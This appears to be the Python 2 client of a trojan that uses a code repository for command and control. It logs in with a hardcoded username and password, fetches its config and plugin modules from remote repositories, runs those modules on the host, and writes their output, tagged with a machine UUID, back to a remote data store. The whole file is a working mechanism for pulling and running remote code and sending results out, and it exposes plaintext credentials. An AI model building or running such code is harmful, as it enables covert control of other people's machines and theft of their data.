from   appdirs import user_cache_dir
from   repo    import Credentials, Repo
from   data    import Datastore
from   plugin  import Plugin
import uuid
import json
import os

from IPython.core.debugger import Tracer

username = 'trjskynet'
password = 'UhDrksp8'

# Fetch config from repository
config_login    = 'simonvpe'
config_repo     = 'trj_config'
config_branch   = 'master'
config_filename = 'config.json'

class UUID(object):
    def __init__(self):
        appname   = "testapp"
        appauthor = "testauthor"
        self.dir  = user_cache_dir(appname, appauthor)

        if not os.path.exists(self.dir):
            os.makedirs(self.dir)
            print "[*] Created %s" % self.dir

    def uuid(self):
        filename = os.path.join(self.dir, 'uuid')
        id = None
        if not os.path.exists(filename):
            id = str(uuid.uuid1())
            f = open(filename, 'w')
            f.write(id)
            f.close()
        else:
            f = open(filename, 'r')
            id = f.readlines()[0]
            f.close()
        return id

class Model(object):
    def __init__(self, cfg_login, cfg_repo, cfg_branch, cfg_filename, cred=None):
        self.credentials = cred
        self.config_repo = Repo(cfg_login, cfg_repo, cfg_branch, cred)
        self.config      = Datastore(self.config_repo, cfg_filename)
        self.data_store  = None
        self.plugin_repo = None
        self.uuid        = UUID()
        self.build(self.config)

    def build(self, config):
        cfg = json.loads(config.data)

        self.data_store = Datastore(
            Repo(
                cfg['data']['login'],
                cfg['data']['repo'],
                cfg['data']['branch'],
                self.credentials
            ),
            self.uuid.uuid()
        )

        self.plugin_repo = Repo(
            cfg['module']['login'],
            cfg['module']['repo'],
            cfg['module']['branch'],
            self.credentials
        )
            

credentials = Credentials(username, password)
model       = Model(config_login, config_repo, config_branch, config_filename, credentials)

# Load cfg
cfg         = json.loads(model.config.data)
plugin_repo = model.plugin_repo
plugins     = cfg['plugins'].keys()
args        = cfg['plugins'].values()
data        = json.loads(model.data_store.data)

# Start plugins
running = []
for name,arg in zip(plugins, args):
    plug = Plugin(plugin_repo, name)
    plug.sync()
    running.append((name, plug.run_async(arg)))

# Join
for name, ret in running:
    val = ret.get()
    data[name] = val

model.data_store.data = json.dumps(data, indent=4)
